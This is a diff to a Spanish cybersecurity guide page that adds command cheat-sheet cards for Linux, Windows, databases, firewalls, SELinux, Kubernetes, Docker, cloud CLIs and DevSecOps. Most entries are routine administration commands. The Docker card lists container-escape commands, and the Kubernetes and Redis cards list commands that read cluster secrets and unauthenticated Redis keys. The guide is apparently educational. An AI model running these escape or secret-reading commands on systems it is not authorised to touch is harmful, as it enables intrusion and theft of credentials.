+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>ps aux --sort=-%cpu</code><span class="cmd-desc">Procesos por CPU</span></div>
+                            <div class="cmd-row"><code>ps aux --sort=-%mem</code><span class="cmd-desc">Procesos por memoria</span></div>
+                            <div class="cmd-row"><code>top -bn1 | head -20</code><span class="cmd-desc">Snapshot de procesos</span></div>
+                            <div class="cmd-row"><code>htop</code><span class="cmd-desc">Monitor interactivo</span></div>
+                            <div class="cmd-row"><code>lsof -i :8080</code><span class="cmd-desc">Proceso que usa el puerto</span></div>
+                            <div class="cmd-row"><code>lsof +L1</code><span class="cmd-desc">Archivos borrados abiertos</span></div>
+                            <div class="cmd-row"><code>free -h</code><span class="cmd-desc">Memoria disponible</span></div>
+                            <div class="cmd-row"><code>df -h</code><span class="cmd-desc">Particiones montadas</span></div>
+                            <div class="cmd-row"><code>du -sh /* 2&gt;/dev/null | sort -h</code><span class="cmd-desc">Uso de disco</span></div>
+                            <div class="cmd-row"><code>kill -9 PID</code><span class="cmd-desc">Terminar proceso</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1600">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-user-clock" style="color: #00c853; margin-right:8px;"></i> Linux - Usuarios y Sesiones</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>whoami</code><span class="cmd-desc">Usuario actual</span></div>
+                            <div class="cmd-row"><code>id</code><span class="cmd-desc">UID, GID y grupos</span></div>
+                            <div class="cmd-row"><code>w / who</code><span class="cmd-desc">Quién está conectado</span></div>
+                            <div class="cmd-row"><code>last / lastb</code><span class="cmd-desc">Logins (éxito/fallidos)</span></div>
+                            <div class="cmd-row"><code>lastlog</code><span class="cmd-desc">Último login de cada usuario</span></div>
+                            <div class="cmd-row"><code>getent passwd</code><span class="cmd-desc">Todos los usuarios</span></div>
+                            <div class="cmd-row"><code>passwd usuario</code><span class="cmd-desc">Cambiar contraseña</span></div>
+                            <div class="cmd-row"><code>useradd -m usuario</code><span class="cmd-desc">Crear usuario</span></div>
+                            <div class="cmd-row"><code>usermod -aG sudo usuario</code><span class="cmd-desc">Añadir a sudo</span></div>
+                            <div class="cmd-row"><code>cat /etc/sudoers</code><span class="cmd-desc">Reglas sudo</span></div>
+                            <div class="cmd-row"><code>chown usuario:grupo archivo</code><span class="cmd-desc">Cambiar propietario</span></div>
+                            <div class="cmd-row"><code>hostname</code><span class="cmd-desc">Nombre del equipo</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1650">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-clipboard-list" style="color: #ff6d00; margin-right:8px;"></i> Análisis de Logs</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>tail -f /var/log/auth.log</code><span class="cmd-desc">Logs de autenticación en vivo</span></div>
+                            <div class="cmd-row"><code>grep "Failed password" /var/log/auth.log</code><span class="cmd-desc">Intentos SSH fallidos</span></div>
+                            <div class="cmd-row"><code>grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c</code><span class="cmd-desc">Top IPs atacantes</span></div>
+                            <div class="cmd-row"><code>grep -E "Accepted|Failed" /var/log/auth.log</code><span class="cmd-desc">Éxitos y fallos SSH</span></div>
+                            <div class="cmd-row"><code>journalctl --since "1 hour ago" -p warning</code><span class="cmd-desc">Avisos recientes</span></div>
+                            <div class="cmd-row"><code>journalctl -u sshd -f</code><span class="cmd-desc">Logs de un servicio en vivo</span></div>
+                            <div class="cmd-row"><code>journalctl -xe</code><span class="cmd-desc">Último error con contexto</span></div>
+                            <div class="cmd-row"><code>tail -f /var/log/apache2/access.log</code><span class="cmd-desc">Accesos web en vivo</span></div>
+                            <div class="cmd-row"><code>last -a | head -20</code><span class="cmd-desc">Últimos logins</span></div>
+                            <div class="cmd-row"><code>ausearch -m avc -ts recent</code><span class="cmd-desc">Denegaciones SELinux</span></div>
+                            <div class="cmd-row"><code>cat /var/log/auth.log | grep -i "root"</code><span class="cmd-desc">Ataques a root</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1700">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-windows" style="color: var(--primary); margin-right:8px;"></i> Windows - Auditoría</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>whoami /all</code><span class="cmd-desc">Usuario y privilegios</span></div>
+                            <div class="cmd-row"><code>whoami /priv</code><span class="cmd-desc">Privilegios (SeDebug, SeImpersonate)</span></div>
+                            <div class="cmd-row"><code>net user</code><span class="cmd-desc">Usuarios locales</span></div>
+                            <div class="cmd-row"><code>net user /domain</code><span class="cmd-desc">Usuarios del dominio</span></div>
+                            <div class="cmd-row"><code>net localgroup administrators</code><span class="cmd-desc">Administradores locales</span></div>
+                            <div class="cmd-row"><code>net group "Domain Admins" /domain</code><span class="cmd-desc">Admins del dominio</span></div>
+                            <div class="cmd-row"><code>systeminfo</code><span class="cmd-desc">Información del sistema</span></div>
+                            <div class="cmd-row"><code>wmic qfe list brief</code><span class="cmd-desc">Parches instalados</span></div>
+                            <div class="cmd-row"><code>netstat -ano</code><span class="cmd-desc">Puertos y PIDs</span></div>
+                            <div class="cmd-row"><code>tasklist | findstr /i "chrome"</code><span class="cmd-desc">Filtrar procesos</span></div>
+                            <div class="cmd-row"><code>taskkill /PID 1234 /F</code><span class="cmd-desc">Matar proceso</span></div>
+                            <div class="cmd-row"><code>powershell -Command "Get-Process"</code><span class="cmd-desc">Procesos con PowerShell</span></div>
+                            <div class="cmd-row"><code>reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"</code><span class="cmd-desc">Autoarranque</span></div>
+                            <div class="cmd-row"><code>netsh wlan show profile</code><span class="cmd-desc">Perfiles WiFi</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1750">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-terminal" style="color: #0078d4; margin-right:8px;"></i> PowerShell</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>Get-Command</code><span class="cmd-desc">Listar cmdlets</span></div>
+                            <div class="cmd-row"><code>Get-Process | Sort-Object CPU -Descending</code><span class="cmd-desc">Procesos por CPU</span></div>
+                            <div class="cmd-row"><code>Get-Service | Where-Object {$_.Status -eq "Running"}</code><span class="cmd-desc">Servicios activos</span></div>
+                            <div class="cmd-row"><code>Get-LocalUser</code><span class="cmd-desc">Usuarios locales</span></div>
+                            <div class="cmd-row"><code>Get-LocalGroupMember Administrators</code><span class="cmd-desc">Miembros de Administradores</span></div>
+                            <div class="cmd-row"><code>Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"</code><span class="cmd-desc">Autoarranque</span></div>
+                            <div class="cmd-row"><code>Get-NetTCPConnection -State Listen</code><span class="cmd-desc">Puertos en escucha</span></div>
+                            <div class="cmd-row"><code>Get-WmiObject Win32_ComputerSystem</code><span class="cmd-desc">Info del sistema</span></div>
+                            <div class="cmd-row"><code>Get-EventLog -LogName Security -Newest 50</code><span class="cmd-desc">Logs de seguridad</span></div>
+                            <div class="cmd-row"><code>Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</code><span class="cmd-desc">Permitir scripts</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1800">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-database" style="color: #26a69a; margin-right:8px;"></i> Bases de Datos</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>mysql -u root -p</code><span class="cmd-desc">Cliente MySQL local</span></div>
+                            <div class="cmd-row"><code>mysql -h IP -u root -p -e "SHOW DATABASES;"</code><span class="cmd-desc">Listar BD remotas</span></div>
+                            <div class="cmd-row"><code>psql -h IP -U postgres</code><span class="cmd-desc">Cliente PostgreSQL</span></div>
+                            <div class="cmd-row"><code>psql -U postgres -c "\l"</code><span class="cmd-desc">Listar bases</span></div>
+                            <div class="cmd-row"><code>mongosh "mongodb://IP:27017"</code><span class="cmd-desc">Cliente MongoDB</span></div>
+                            <div class="cmd-row"><code>redis-cli -h IP info</code><span class="cmd-desc">Info Redis</span></div>
+                            <div class="cmd-row"><code>redis-cli -h IP KEYS "*"</code><span class="cmd-desc">Claves Redis (si sin auth)</span></div>
+                            <div class="cmd-row"><code>sqlite3 base.db ".tables"</code><span class="cmd-desc">Tablas SQLite</span></div>
+                            <div class="cmd-row"><code>sqlcmd -S IP -U sa -P pass</code><span class="cmd-desc">SQL Server (Windows)</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1850">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-fire" style="color: #ff6d00; margin-right:8px;"></i> Firewalls y Hardening</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>ufw status verbose</code><span class="cmd-desc">Estado del firewall</span></div>
+                            <div class="cmd-row"><code>ufw enable</code><span class="cmd-desc">Activar UFW</span></div>
+                            <div class="cmd-row"><code>ufw allow 22/tcp</code><span class="cmd-desc">Permitir SSH</span></div>
+                            <div class="cmd-row"><code>ufw deny 23/tcp</code><span class="cmd-desc">Denegar Telnet</span></div>
+                            <div class="cmd-row"><code>ufw delete allow 22/tcp</code><span class="cmd-desc">Eliminar regla</span></div>
+                            <div class="cmd-row"><code>iptables -L -n -v</code><span class="cmd-desc">Reglas actuales</span></div>
+                            <div class="cmd-row"><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</code><span class="cmd-desc">Abrir puerto</span></div>
+                            <div class="cmd-row"><code>iptables-save</code><span class="cmd-desc">Guardar reglas</span></div>
+                            <div class="cmd-row"><code>nft list ruleset</code><span class="cmd-desc">Reglas nftables</span></div>
+                            <div class="cmd-row"><code>fail2ban-client status sshd</code><span class="cmd-desc">Estado de fail2ban</span></div>
+                            <div class="cmd-row"><code>apparmor_status</code><span class="cmd-desc">Perfiles AppArmor</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1900">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-redhat" style="color: var(--accent); margin-right:8px;"></i> Red Hat - DNF y Gestión de Paquetes</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>dnf search httpd</code><span class="cmd-desc">Buscar paquete</span></div>
+                            <div class="cmd-row"><code>dnf install nano</code><span class="cmd-desc">Instalar paquete</span></div>
+                            <div class="cmd-row"><code>dnf remove nano</code><span class="cmd-desc">Desinstalar</span></div>
+                            <div class="cmd-row"><code>dnf update -y</code><span class="cmd-desc">Actualizar todo</span></div>
+                            <div class="cmd-row"><code>dnf upgrade --security</code><span class="cmd-desc">Actualizar solo seguridad</span></div>
+                            <div class="cmd-row"><code>dnf list installed</code><span class="cmd-desc">Paquetes instalados</span></div>
+                            <div class="cmd-row"><code>dnf repolist</code><span class="cmd-desc">Repositorios activos</span></div>
+                            <div class="cmd-row"><code>dnf history</code><span class="cmd-desc">Historial de dnf</span></div>
+                            <div class="cmd-row"><code>rpm -qa</code><span class="cmd-desc">Verificar paquetes RPM</span></div>
+                            <div class="cmd-row"><code>rpm -qf /etc/ssh/sshd_config</code><span class="cmd-desc">A qué paquete pertenece</span></div>
+                            <div class="cmd-row"><code>rpm -qif /usr/bin/ssh</code><span class="cmd-desc">Info de un paquete</span></div>
+                            <div class="cmd-row"><code>rpm -V openssh-server</code><span class="cmd-desc">Verificar integridad</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="1950">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-shield" style="color: #ff6d00; margin-right:8px;"></i> Red Hat - SELinux</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>getenforce</code><span class="cmd-desc">Estado actual</span></div>
+                            <div class="cmd-row"><code>setenforce 1</code><span class="cmd-desc">Activar enforcing</span></div>
+                            <div class="cmd-row"><code>setenforce 0</code><span class="cmd-desc">Modo permissive (temporal)</span></div>
+                            <div class="cmd-row"><code>sestatus</code><span class="cmd-desc">Estado detallado</span></div>
+                            <div class="cmd-row"><code>ls -Z /etc/passwd</code><span class="cmd-desc">Ver contexto SELinux</span></div>
+                            <div class="cmd-row"><code>ausearch -m avc -ts recent</code><span class="cmd-desc">Ver denegaciones</span></div>
+                            <div class="cmd-row"><code>audit2allow -a -M mi_politica</code><span class="cmd-desc">Generar política desde AVC</span></div>
+                            <div class="cmd-row"><code>semodule -i mi_politica.pp</code><span class="cmd-desc">Instalar política</span></div>
+                            <div class="cmd-row"><code>semanage fcontext -a -t httpd_sys_content_t /var/www/html</code><span class="cmd-desc">Etiquetar</span></div>
+                            <div class="cmd-row"><code>restorecon -Rv /var/www/html</code><span class="cmd-desc">Restaurar etiquetas</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2000">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-fire-extinguisher" style="color: #00c853; margin-right:8px;"></i> Red Hat - Firewalld y Servicios</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>firewall-cmd --list-all</code><span class="cmd-desc">Reglas activas</span></div>
+                            <div class="cmd-row"><code>firewall-cmd --list-ports</code><span class="cmd-desc">Puertos abiertos</span></div>
+                            <div class="cmd-row"><code>firewall-cmd --add-service=http --permanent</code><span class="cmd-desc">Abrir HTTP</span></div>
+                            <div class="cmd-row"><code>firewall-cmd --add-port=8080/tcp --permanent</code><span class="cmd-desc">Abrir puerto</span></div>
+                            <div class="cmd-row"><code>firewall-cmd --reload</code><span class="cmd-desc">Aplicar cambios</span></div>
+                            <div class="cmd-row"><code>firewall-cmd --zone=trusted --add-source=10.0.0.0/24</code><span class="cmd-desc">Zona confiable</span></div>
+                            <div class="cmd-row"><code>systemctl status sshd</code><span class="cmd-desc">Estado del servicio</span></div>
+                            <div class="cmd-row"><code>systemctl enable --now sshd</code><span class="cmd-desc">Habilitar al arranque</span></div>
+                            <div class="cmd-row"><code>journalctl -u sshd -f</code><span class="cmd-desc">Logs en vivo</span></div>
+                            <div class="cmd-row"><code>systemctl enable --now cockpit.socket</code><span class="cmd-desc">Panel web Cockpit</span></div>
+                            <div class="cmd-row"><code>subscription-manager register --username usuario</code><span class="cmd-desc">Registrar suscripción</span></div>
+                            <div class="cmd-row"><code>sosreport</code><span class="cmd-desc">Reporte de diagnóstico</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2050">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-save" style="color: #00c853; margin-right:8px;"></i> Mantenimiento y Backup</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>tar -czvf backup.tar.gz /dir</code><span class="cmd-desc">Comprimir backup</span></div>
+                            <div class="cmd-row"><code>tar -tzvf backup.tar.gz</code><span class="cmd-desc">Listar contenido</span></div>
+                            <div class="cmd-row"><code>tar -xzvf backup.tar.gz</code><span class="cmd-desc">Extraer backup</span></div>
+                            <div class="cmd-row"><code>rsync -avz /origen/ user@host:/destino/</code><span class="cmd-desc">Sincronizar</span></div>
+                            <div class="cmd-row"><code>rsync -avz --delete /origen/ /backup/</code><span class="cmd-desc">Mirror con borrado</span></div>
+                            <div class="cmd-row"><code>scp archivo usuario@host:/dest/</code><span class="cmd-desc">Copia segura</span></div>
+                            <div class="cmd-row"><code>ssh-copy-id usuario@host</code><span class="cmd-desc">Copiar clave SSH</span></div>
+                            <div class="cmd-row"><code>dd if=/dev/sda of=/dev/sdb bs=4M</code><span class="cmd-desc">Clonar disco</span></div>
+                            <div class="cmd-row"><code>gpg -c backup.tar.gz</code><span class="cmd-desc">Cifrar backup</span></div>
+                            <div class="cmd-row"><code>chmod 600 backup.key</code><span class="cmd-desc">Proteger clave</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2100">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-cubes" style="color: #3f8cff; margin-right:8px;"></i> Kubernetes</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>kubectl cluster-info</code><span class="cmd-desc">Info del cluster</span></div>
+                            <div class="cmd-row"><code>kubectl get nodes -o wide</code><span class="cmd-desc">Nodos del cluster</span></div>
+                            <div class="cmd-row"><code>kubectl get pods -A</code><span class="cmd-desc">Todos los pods</span></div>
+                            <div class="cmd-row"><code>kubectl get svc,ep --all-namespaces</code><span class="cmd-desc">Servicios y endpoints</span></div>
+                            <div class="cmd-row"><code>kubectl get secrets --all-namespaces</code><span class="cmd-desc">Secrets del cluster</span></div>
+                            <div class="cmd-row"><code>kubectl get serviceaccounts --all-namespaces</code><span class="cmd-desc">ServiceAccounts</span></div>
+                            <div class="cmd-row"><code>kubectl get rolebindings,clusterrolebindings --all-namespaces</code><span class="cmd-desc">Permisos RBAC</span></div>
+                            <div class="cmd-row"><code>kubectl describe node nodo</code><span class="cmd-desc">Info del nodo</span></div>
+                            <div class="cmd-row"><code>kubectl get secret creds -o yaml</code><span class="cmd-desc">Secreto en YAML</span></div>
+                            <div class="cmd-row"><code>kubectl exec -it pod -- sh</code><span class="cmd-desc">Shell dentro del pod</span></div>
+                            <div class="cmd-row"><code>kubectl run shell --image=busybox --rm -it -- /bin/sh</code><span class="cmd-desc">Pod de prueba</span></div>
+                            <div class="cmd-row"><code>kubectl auth can-i --list</code><span class="cmd-desc">Permisos del usuario actual</span></div>
+                            <div class="cmd-row"><code>kubectl auth whoami</code><span class="cmd-desc">Identidad actual</span></div>
+                            <div class="cmd-row"><code>helm list -A</code><span class="cmd-desc">Releases de Helm</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2150">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-box" style="color: var(--accent); margin-right:8px;"></i> Docker y Contenedores</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>docker ps -a</code><span class="cmd-desc">Contenedores</span></div>
+                            <div class="cmd-row"><code>docker images</code><span class="cmd-desc">Imágenes locales</span></div>
+                            <div class="cmd-row"><code>docker inspect contenedor</code><span class="cmd-desc">Config completa</span></div>
+                            <div class="cmd-row"><code>docker exec -it id sh</code><span class="cmd-desc">Shell en contenedor</span></div>
+                            <div class="cmd-row"><code>docker network ls</code><span class="cmd-desc">Redes de Docker</span></div>
+                            <div class="cmd-row"><code>docker system df</code><span class="cmd-desc">Uso de recursos</span></div>
+                            <div class="cmd-row"><code>docker run -it --privileged --pid=host busybox</code><span class="cmd-desc">Escape (contenedor privileged)</span></div>
+                            <div class="cmd-row"><code>docker run -v /:/mnt -it busybox</code><span class="cmd-desc">Montar el host en /mnt</span></div>
+                            <div class="cmd-row"><code>nsenter -t 1 -m -u -i -n sh</code><span class="cmd-desc">Entrar al namespace del host</span></div>
+                            <div class="cmd-row"><code>chroot /proc/1/root /bin/sh</code><span class="cmd-desc">Chroot al filesystem del host</span></div>
+                            <div class="cmd-row"><code>docker save imagen -o img.tar</code><span class="cmd-desc">Exportar imagen</span></div>
+                            <div class="cmd-row"><code>docker pull alpine</code><span class="cmd-desc">Descargar imagen</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2200">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-cloud" style="color: #00c853; margin-right:8px;"></i> Cloud - AWS / GCP / Azure</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>aws sts get-caller-identity</code><span class="cmd-desc">Identidad AWS actual</span></div>
+                            <div class="cmd-row"><code>aws s3 ls</code><span class="cmd-desc">Buckets S3</span></div>
+                            <div class="cmd-row"><code>aws s3 ls s3://bucket --recursive</code><span class="cmd-desc">Contenido de un bucket</span></div>
+                            <div class="cmd-row"><code>aws s3 cp s3://bucket/archivo . --no-sign-request</code><span class="cmd-desc">Bucket público</span></div>
+                            <div class="cmd-row"><code>aws iam list-users</code><span class="cmd-desc">Usuarios IAM</span></div>
+                            <div class="cmd-row"><code>aws iam list-attached-user-policies --user-name admin</code><span class="cmd-desc">Políticas IAM</span></div>
+                            <div class="cmd-row"><code>aws secretsmanager list-secrets</code><span class="cmd-desc">Secrets Manager</span></div>
+                            <div class="cmd-row"><code>aws ec2 describe-instances</code><span class="cmd-desc">Instancias EC2</span></div>
+                            <div class="cmd-row"><code>gcloud auth list</code><span class="cmd-desc">Cuentas GCP</span></div>
+                            <div class="cmd-row"><code>gcloud compute instances list</code><span class="cmd-desc">Instancias GCP</span></div>
+                            <div class="cmd-row"><code>gcloud iam roles list</code><span class="cmd-desc">Roles IAM GCP</span></div>
+                            <div class="cmd-row"><code>az account list</code><span class="cmd-desc">Suscripciones Azure</span></div>
+                            <div class="cmd-row"><code>az vm list -o table</code><span class="cmd-desc">Máquinas virtuales Azure</span></div>
+                            <div class="cmd-row"><code>az ad user list</code><span class="cmd-desc">Usuarios Azure AD</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="2250">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-code-branch" style="color: #26a69a; margin-right:8px;"></i> DevSecOps y CI/CD</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>git log --oneline -20</code><span class="cmd-desc">Historial de commits</span></div>
+                            <div class="cmd-row"><code>git diff HEAD^ HEAD</code><span class="cmd-desc">Cambios de un commit</span></div>
+                            <div class="cmd-row"><code>git log -p --follow -- archivo.js</code><span class="cmd-desc">Historial de un archivo</span></div>
+                            <div class="cmd-row"><code>trivy image nginx:latest</code><span class="cmd-desc">Escanear imagen Docker</span></div>
+                            <div class="cmd-row"><code>trivy fs .</code><span class="cmd-desc">Escanear repositorio</span></div>
+                            <div class="cmd-row"><code>grype nginx:latest</code><span class="cmd-desc">Escáner alternativo (Anchore)</span></div>
+                            <div class="cmd-row"><code>snyk test</code><span class="cmd-desc">Vulnerabilidades del proyecto</span></div>
+                            <div class="cmd-row"><code>npm audit --production</code><span class="cmd-desc">Auditoría de dependencias npm</span></div>
+                            <div class="cmd-row"><code>pip-audit</code><span class="cmd-desc">Auditoría de Python</span></div>
+                            <div class="cmd-row"><code>gitleaks detect --source .</code><span class="cmd-desc">Detectar secretos en git</span></div>
+                            <div class="cmd-row"><code>git-secrets --scan</code><span class="cmd-desc">Buscar secretos (AWS)</span></div>
+                            <div class="cmd-row"><code>semgrep --config=p/security-audit .</code><span class="cmd-desc">Análisis SAST estático</span></div>
                         </div>
                     </div>
                 </div>
@@ -155,9 +974,10 @@ wfuzz -c -z file,wordlist.txt    <span class="code-comment"># Fuzzing</span></co
         </div>
     </main>
 
-    <footer class="footer-cyber"><div class="container"><p><i class="fas fa-shield-halved" style="color: var(--primary);"></i> Guía de Ciberseguridad &copy; 2025copy; <span class="current-year">2026</span></p></div></footer>
+    <footer class="footer-cyber"><div class="container"><p><i class="fas fa-shield-halved" style="color: var(--primary);"></i> Guía de Ciberseguridad &copy; <span class="current-year">2026</span></p></div></footer>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="js/theme.js"></script>
+    <button id="scrollTopBtn" class="scroll-top-btn" aria-label="Volver arriba" title="Volver arriba"><i class="fas fa-chevron-up"></i></button>
 </body>
 </html>
